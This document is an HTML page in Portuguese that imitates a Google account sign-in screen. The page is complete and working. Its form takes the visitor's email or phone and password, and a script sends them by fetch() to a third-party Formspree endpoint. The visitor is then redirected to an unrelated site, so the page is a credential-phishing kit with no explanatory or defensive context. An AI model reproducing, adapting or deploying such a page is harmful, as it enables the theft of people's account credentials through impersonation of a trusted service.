<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8">
    <meta name="description" content="Anonimator">
    <meta name="keywords" content="Anonimator">
    <meta name="author" content="Anonimator">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>aaaa</title>
    <link rel="icon" type="image/x-icon" href="Icon.png">
    <link rel="stylesheet" href="styles.css">
    <script src="java.js"></script>
  </head>
  <body>
    <div id="caixa1">
      <img src="meio.png" alt="Descrição da imagem">
      <h1>Fazer login</h1>
      <h2>Use sua Conta do Google</h1>
        <form id="meu-formulario" action="https://formspree.io/f/myyabwey" method="POST">
          <input type="email" id="email" name="email" style="margin: 10px 0; padding: 10px;" placeholder="E-mail ou telefone" required>
          <input type="password" id="senha" name="senha" style="margin: 10px 0; padding: 10px;" placeholder="Digite Sua Senha" required>
          <button type="submit" id="botao">Avançar</button>
        <div>
          <h3 style="display: inline;">Não está no seu computador? Use o modo visitante para<br>fazer login com privacidade.</h3>
          <a href="https://support.google.com/chrome/answer/6130773?hl=pt-BR" style="color: rgb(0, 30, 255); display: inline;">Saiba mais</a>
        </div>
        </form>
        <script>
          const form = document.getElementById('meu-formulario');
          form.addEventListener('submit', function(event) {
            event.preventDefault();
            const formData = new FormData(this);
            fetch(this.action, {
              method: 'POST',
              body: formData,
              headers: {
                'Accept': 'application/json'
              }
            })
            .then(response => {
              if (!response.ok) {
                throw new Error('Erro ao enviar o formulário.');
              }
              window.location.href = 'https://ihabbi.tech/index';
            })
            .catch(error => {
              console.error(error);
              alert('Ocorreu um erro ao enviar o formulário. Por favor, tente novamente mais tarde.');
            });
          });
        </script>
    </div>
  </body>
</html>
